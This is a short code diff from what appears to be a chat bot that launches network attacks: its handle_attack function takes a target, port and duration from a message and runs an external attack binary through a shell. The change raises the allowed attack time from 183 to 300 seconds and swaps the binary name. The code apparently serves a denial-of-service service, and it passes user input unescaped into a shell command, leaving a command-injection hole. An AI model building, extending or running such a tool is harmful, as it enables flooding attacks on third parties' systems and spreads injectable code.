@@ -290,8 +290,8 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 183:
-                response = "Error: Time interval must be less than 183"
+            if time > 300:
+                response = "Error: Time interval must be less than 300"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./ranbal {target} {port} {time}"
+                    full_command = f"./gyrange {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
